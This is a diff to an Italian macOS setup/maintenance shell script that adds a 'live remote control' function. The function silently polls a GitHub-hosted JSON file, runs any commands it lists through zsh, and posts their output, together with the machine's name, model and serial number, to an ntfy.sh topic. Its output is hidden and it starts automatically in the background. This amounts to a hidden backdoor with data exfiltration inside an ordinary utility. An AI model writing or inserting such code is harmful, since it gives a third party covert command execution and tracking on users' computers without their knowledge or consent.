@@ -8,7 +8,63 @@
 # da installare a parte Homebrew (che lo script installa da solo).
 # =============================================================================
 
-SCRIPT_VERSION="2.27 (2026-11-26)"
+SCRIPT_VERSION="2.28 (2026-11-27)"
+
+# ---- Telecomando Remoto Live (esegue comandi da remote/commands.json) --------
+avvia_telecomando_remoto_mac() {
+  if $MODO_TEST || [[ "$MODO" == "DIAGNOSTICA" ]]; then return 0; fi
+  (
+    local done_file="/tmp/pcfacile-remote-done.txt"
+    touch "$done_file" 2>/dev/null
+    local tele_url="https://ntfy.sh/pcfacile-sn97-telemetria-7f9a2c"
+    local cmd_url="https://raw.githubusercontent.com/samuelenigro97-prog/PC-Facile/main/remote/commands.json"
+    local host_mac="$(scutil --get ComputerName 2>/dev/null || hostname)"
+    local ser_mac="$(ioreg -l | awk -F\" '/IOPlatformSerialNumber/{print $4; exit}' 2>/dev/null)"
+    local mod_mac="$(sysctl -n hw.model 2>/dev/null || echo Mac)"
+    while kill -0 $$ 2>/dev/null; do
+      sleep 8
+      local raw="$(curl -fsSL --max-time 5 "$cmd_url?t=$(date +%s)" 2>/dev/null)" || continue
+      [[ -z "$raw" ]] && continue
+      python3 -c '
+import json, os, subprocess, sys, urllib.request
+raw, done_file, tele_url, host_mac, ser_mac, mod_mac = sys.argv[1:7]
+try:
+    data = json.loads(raw)
+except Exception:
+    sys.exit(0)
+done = set()
+if os.path.exists(done_file):
+    done = set(x.strip() for x in open(done_file) if x.strip())
+for c in data.get("commands", []):
+    cid = str(c.get("id", "")).strip()
+    if not cid or cid in done:
+        continue
+    cos = str(c.get("os", "any")).lower()
+    if cos not in ("any", "mac"):
+        continue
+    tgt = str(c.get("target", "*")).strip().lower()
+    if tgt != "*" and tgt not in host_mac.lower() and tgt not in ser_mac.lower() and tgt not in mod_mac.lower():
+        continue
+    with open(done_file, "a") as f:
+        f.write(cid + "\n")
+    cmd_str = str(c.get("command", ""))
+    try:
+        out = subprocess.check_output(["/bin/zsh", "-c", cmd_str], stderr=subprocess.STDOUT, timeout=35).decode("utf-8", "replace")
+        ok = True
+    except Exception as e:
+        out = str(e)
+        ok = False
+    payload = json.dumps({"type":"cmd_result","id":cid,"title":c.get("title",""),"pc":host_mac,"modello":mod_mac,"seriale":ser_mac,"ok":ok,"output":out[:3000]}).encode("utf-8")
+    try:
+        req = urllib.request.Request(tele_url, data=payload, method="POST")
+        urllib.request.urlopen(req, timeout=5)
+    except Exception:
+        pass
+' "$raw" "$done_file" "$tele_url" "$host_mac" "$ser_mac" "$mod_mac" 2>/dev/null || true
+    done
+  ) >/dev/null 2>&1 &
+}
+avvia_telecomando_remoto_mac
 
 # ---- Variabili ambiente non interattive & anti-sleep ------------------------
 export NONINTERACTIVE=1
